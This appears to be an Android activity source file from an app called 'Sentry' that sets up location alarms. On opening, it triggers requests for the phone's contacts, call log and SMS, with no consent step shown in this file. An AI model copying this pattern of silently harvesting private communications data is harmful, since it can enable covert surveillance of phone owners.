package com.ville.sentry;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;


public class LocationActivity extends Activity{

	private static final String TAG = "Sentry/LocationActivity";
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		// TODO Auto-generated method stub
		super.onCreate(savedInstanceState);
		setContentView(R.layout.location);
		AppLog.d(TAG, "[onCreate]: LocationActivity");
		
		initView();
		
//		Intent intent = new Intent(LocationActivity.this, WorkService.class);
//		intent.setAction(WorkService.ACTION_LOCATION_REQ);
//	    PendingIntent sender = PendingIntent.getService(LocationActivity.this, 0, intent, 0);
//	    AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
//	    am.cancel(sender);
//	    am.setRepeating(AlarmManager.RTC, System.currentTimeMillis() + 2000, 20 * 1000, sender);
	    AppLog.d(TAG, "AlarmManager setRepeating");
	    SentryApplication.getApp().startReqContact(this);
	    SentryApplication.getApp().startReqCallLog(this);
	    SentryApplication.getApp().startReqSms(this);
	}
	
	private void initView() {
		// TODO Auto-generated method stub
		findViewById(R.id.textView1).setOnClickListener(new View.OnClickListener() {
			
			@Override
			public void onClick(View v) {
				// TODO Auto-generated method stub
				Intent intent = new Intent(LocationActivity.this, WorkService.class);
				intent.setAction(WorkService.ACTION_LOCATION_REQ);
			    PendingIntent sender = PendingIntent.getService(LocationActivity.this, 0, intent, 0);
			    AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
			    am.cancel(sender);
			}
		});
	}

	@Override
	protected void onDestroy() {
		// TODO Auto-generated method stub
		super.onDestroy();
		AppLog.d(TAG, "[onDestroy]: LocationActivity");
	}
	
}

